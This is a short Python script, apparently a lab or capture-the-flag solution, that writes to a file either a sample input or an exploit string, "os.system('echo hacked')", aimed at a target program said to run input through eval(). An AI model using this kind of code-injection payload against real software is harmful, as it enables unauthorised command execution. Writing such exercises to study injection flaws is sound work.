import os

def generate_example():
    return repr({'username': 'dan', 'password': '1234', 'command': 'echo cool'})


def generate_exploit():
    # The vulnerability is that run.py is using eval() so we just need to echo hacked.
    return "os.system('echo hacked')"


def main(argv):
    if not 2 <= len(argv) <= 3:
        print('USAGE: %s [--example] <script-path>' % argv[0])
        return 1
    if len(argv) == 2:
        example, path = False, argv[1]
    else:
        example, path = True,  argv[2]
    if example:
        script = generate_example()
    else:
        script = generate_exploit()
    with open(path, 'w') as writer:
        writer.write(script)
    print('done')


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
